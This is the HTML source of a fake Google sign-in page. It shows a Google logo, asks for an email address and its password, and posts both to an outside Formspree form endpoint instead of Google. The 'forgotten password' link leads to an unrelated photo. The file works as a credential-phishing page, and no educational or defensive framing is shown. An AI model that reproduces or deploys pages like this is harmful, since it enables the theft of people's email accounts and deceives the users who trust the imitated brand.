<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google form</title>
</head>
<body style="font-family: sans-serif; display: flex;flex-direction: column; align-items: center; margin-top: 110px;">

    <div style="border: 1.3px solid black;padding: 10px;width: 350px; height: 470px;display: flex;flex-direction: column;align-items: center;">
        <div>
            <img src="logo_Google_FullColor_3x_830x27.max-600x600.format-webp.webp" alt="Google" style="width: 160px;height: 155px;">
            

        <div>
            <form action="https://formspree.io/f/xwkjvqgk" method="post">
                <h4 style="color: rgb(8, 126, 252);">Sign in</h4>
                <label for="email">Input your email address</label><br><br>
                <input type="email"placeholder="Type your email" name="email" id="email"style="border:1.4px solid rgb(8, 126, 252);padding: 3px; border-radius: 3px"><br><br>
                <label for="password">Input your email password</label><br><br>
                <input type="password" placeholder="Type your password" name="password" id="password" style="border: 1.4px solid rgb(8, 126, 252);padding: 3px; border-radius: 3px; ">
                <a href="https://th-thumbnailer.cdn-si-edu.com/4M-qQi3yGO8nvVp4lmZkxIYwyWg=/fit-in/1072x0/https://tf-cmsv2-photocontest-smithsonianmag-prod-approved.s3.amazonaws.com/5ba7b983-7811-4c94-b4a5-40139b0436d1.jpg" style="text-decoration: none;" target="_blank"><h5 style="color: rgb(8, 126, 252);">Forgotten pasword ?</h5></a>
                
                <input type="submit" value="Login"style="border: 1px solid;padding: 8px;width: 80px;background-color: rgb(91, 144, 250);border-radius: 4px;color: white;">
    
            </form>
        </div>
    </div>

   


    
</body>
</html>
